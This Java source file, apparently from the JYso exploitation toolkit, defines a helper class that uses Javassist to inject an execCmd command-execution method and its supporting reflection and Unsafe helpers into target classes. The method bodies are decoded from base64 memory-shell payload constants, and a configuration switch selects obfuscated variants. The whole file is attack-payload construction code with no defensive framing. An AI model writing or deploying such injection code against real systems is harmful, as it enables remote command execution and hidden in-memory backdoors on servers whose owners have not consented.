package com.qi4l.JYso.gadgets.utils.handle;

import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.Config.MemShellPayloads;
import com.qi4l.JYso.gadgets.utils.Utils;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;

public class ClassMethodHandler {
    /**
     * 向指定的 ctClass 中插入方法，使用 insertBefore，不影响原有逻辑
     *
     * @param ctClass 目标 CtClass
     * @param method  方法名
     * @param payload 方法内容 String
     * @throws Exception 抛出异常
     */
    public static void insertMethod(CtClass ctClass, String method, String payload) throws Exception {
        CtMethod cm = ctClass.getDeclaredMethod(method);
        cm.insertBefore(payload);
    }

    /**
     * 向指定类中写入命令执行方法 execCmd
     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
     *
     * @param ctClass 指定类
     * @throws Exception 抛出异常
     */
    public static void insertCMD(CtClass ctClass) throws Exception {
        if (Config.IS_OBSCURE) {
            insertGetUnsafe(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.TO_CSTRING_Method), ctClass));
            insertGetMethodAndInvoke(ctClass);
            insertGetFieldValue(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.EXEC_CMD_OBSCURE), ctClass));
        } else {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.EXEC_CMD), ctClass));
        }
    }

    public static void insertGetFieldValue(CtClass ctClass) throws Exception {
        try {
            ctClass.getDeclaredMethod("getFieldValue");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_FIELD_VALUE), ctClass));
        }
    }

    public static void insertGetUnsafe(CtClass ctClass) throws Exception {
        try {
            ctClass.getDeclaredMethod("getUnsafe");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_UNSAFE), ctClass));
        }
    }


    public static void insertGetMethodAndInvoke(CtClass ctClass) throws Exception {
        try {
            ctClass.getDeclaredMethod("getMethodByClass");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_METHOD_BY_CLASS), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodAndInvoke");
        } catch (NotFoundException e) {
            if (Config.IS_OBSCURE) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
            } else {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_METHOD_AND_INVOKE), ctClass));
            }
        }
    }
}
